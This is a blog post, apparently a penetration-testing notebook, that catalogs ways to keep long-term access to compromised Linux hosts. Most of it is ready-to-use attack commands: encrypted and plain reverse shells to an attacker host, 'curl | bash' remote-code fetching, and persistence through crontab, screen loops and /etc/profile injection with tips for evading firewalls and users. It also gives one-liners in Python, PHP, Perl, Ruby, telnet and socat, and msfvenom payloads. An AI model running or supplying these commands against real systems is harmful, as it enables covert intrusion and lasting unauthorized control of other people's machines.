---
title: privileges_remain
date: 2024-08-28 19:02:33
tags:
categories:
- penetration
---

- [backdoor sustainability](#backdoor-sustainability)
- [the most useful frequently(excerpts)](#the-most-useful-frequentlyexcerpts)
    - [openSSL reverse terminal by encryption](#openssl-reverse-terminal-by-encryption)
    - [simply reverse bash shell](#simply-reverse-bash-shell)
    - [hidden protocal simply](#hidden-protocal-simply)
- [multiple methods inclusion](#multiple-methods-inclusion)
    - [1. screen](#1-screen)
    - [2. crontab](#2-crontab)
    - [3. netcat](#3-netcat)
    - [4. curl reverse](#4-curl-reverse)
    - [5. /etc/profile](#5-etcprofile)
    - [6. Socat reverses shell](#6-socat-reverses-shell)
    - [7. Telnet reverses shell](#7-telnet-reverses-shell)
        - [Method 1](#method-1)
        - [Method 2](#method-2)
    - [8. python](#8-python)
    - [9. php](#9-php)
    - [10. Perl](#10-perl)
    - [11. Ruby](#11-ruby)
    - [12. Metasploit venom](#12-metasploit-venom)
    - [13. get full terminal](#13-get-full-terminal)


# backdoor sustainability

This article refers to much a lot `Marcus_Holloway`'s blog, the original link is https://xz.aliyun.com/t/9488 . As I know, how to remain a long term privileges on hacked computers is important for cybersecurity leaners, so I want to do more researches standing on the shoulders of giants. This is a continuous-updating blog of mine for accumulating some interesting permission sustainability.

# the most useful frequently(excerpts)

### openSSL reverse terminal by encryption

You can hide the network protocol and raw content for avoiding firewall detection.

    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
    or
    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 10000 -nodes

    # normally the commands need your a lot input as its additional description and messages, but you can only press Enter thoroughly for convenience

Sometimes you may think can we generate a unlimited days expiry, but sadly it cannot generate a Asymetric secrets without specific expiry. However, you can point a very huge days as its expiry, but normally the clients would not trust such a secret certificate because of the too massive number, such as browers. Normally you can generate one year or 3 years as its expiry.

Parameters:

  - req: create and deal with certificate
  - -x509: it is a self-signed certificate, rather than certificate signing request(CSR)
  - -newkey rsa:2048: generate a new RSA private secret, and demand the length of the secret is 2048 bit.
  - -keyout key.pem: set up the private key's output path
  - -out cert.pem: set up the certificate (public key)'s output path
  - -days 365: expiry time is 365 days
  - -nodes: the generated private key doesn't need secert protection

Use the attacker's VPS listens on port 2333:

    openssl s_server -quiet -key key.pem -cert cert.pem -port 2333

It creates a SSL/TLS server on 2333 port, and then execute the command on hacked host to reverse its shell:

    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <VPS_IP>:2333 > /tmp/s; rm /tmp/s

Then hacker would gain a shell. Sometimes you may write it into `/etc/profile`, `crontab` or `screen`, you can input such command, which makes the reverse shell connect you per 2 mins:

    while true; do
        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:2333 > /tmp/s; rm /tmp/s
        sleep 120
    done

### simply reverse bash shell

Attacker's VPS listens on port 2333:

    nc -lvvp 2333

Attacker's host execute such a command:

    /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1

### hidden protocal simply

Attacker creates `index.html` on his public server, and the raw content is:

    /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1

Hacked computer executes such one command:
    
    curl <attacker_ip> | bash

It can hide the network and the firewall may think it's only a http web stream. But other network security devices may detect its raw content!

# multiple methods inclusion

### 1. screen

    screen -s test

输入

    while true; do
        /bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
    done

    while true; do
        /bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
        sleep 120
    done

openSSL加密SSL协议后门反弹不直接bash -i

    while true; do
        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <attacker_ip>:<port> > /tmp/s; rm /tmp/s
        sleep 120
    done

### 2. crontab

  * * * * * /bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

I advice if you want to write tasks into crontab, you need to check if it works in crontab. Because sometimes if you are a low priviledge, then you may have no crontab permission, even you did `crontab -e`.

We need to know our username on host, and then write into `/var/spool/cron/[crontabs]/<username>` , or it doesn't work. For example, I am root, then we need to write into `/var/spool/cron/root`(centos); Or `/var/spool/cron/crontabs/root` (Debian/Ubuntu)

### 3. netcat

if hacked host has `netcat`, then `netcat ip port -e /bin/bash`

### 4. curl reverse

attacker creates `index.html` on VPS, and its content is `/bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1`

then attacked host executes the command:

    curl <attacker_ip> | bash

### 5. /etc/profile

If someone logs in the Linux, then it must trigger `/etc/profile`, such as log in locally or SSH login.

If someone doesn't login shell(using strange methods to login and use sh or bash), then `/etc/profile` wont be triggered.

You can input such command into `/etc/profile`:

    /bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1 &
    # the last ampersand makes the command in daemon, to avoid user's commands cannot execute and lead to the exposure.

### 6. Socat reverses shell

Socat is a multiple functional network tool, and it's similar to netcat.
    
    apt-get install socat

    Or

    wget from http://www.dest-unreach.org/socat

Attacker listens his VPS on specific port:
    
    socat TCP-LISTEN:2333 -

    Or

    nc -lvvp 2333
    
Target host command:

    socat tcp-connect:<attacker_ip>:<port> exec:'bash -li',pty,stderr,setsid,sigint,sane

### 7. Telnet reverses shell

If hacked host has no nc, we can use telnet to reverse shell

##### Method 1

Attacker listens on specific port:

    nc -lvvp 2333

Hacked host connects:
    
    mknod a p; telnet <attacker_ip> <port> 0<a | /bin/bash 1>a

##### Method 2

Attacker needs open 2 listening ports, one for inut, another for output:

    nc -lvvp 2333
    nc -lvvp 4000

Hacked host connects:

    telnet <attacker_ip> <port> | /bin/bash | telnet <attacker_ip> <port>

### 8. python
    
    nc -lvvp 2333

Then hacked host:
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

### 9. php

    nc -lvvp 2333

Hacked host:
    
    php -r '$sock=fsockopen("<attacker_ip>",2333);exec("/bin/sh -i <&3 >&3 2>&3");'

### 10. Perl

    nc -lvvp 2333

Then hacked host:
    
    perl -e 'use Socket;$i="<attacker_ip>";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

### 11. Ruby

    nc -lvvp 2333

Hacked host:

    ruby -rsocket -e 'c=TCPSocket.new("<attacker_ip>","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

    Or

    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attacker_ip>","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

### 12. Metasploit venom

`msfvenom -l` enquiries which platform.

    msfvenom -l payloads | grep 'cmd/unix/reverse'

    msfvenom -p cmd/unix/reverse_python LHOST=<attacker_ip> LPORT=2333 -f raw

### 13. get full terminal

Normally we gain the shell, but we cannot use vim. So there is a python method to escalate the shell's use. But I tested the method, it sometimes doesnot work, and I need to do more tests and researches.

    python -c "import pty;pty.spawn('/bin/bash')"
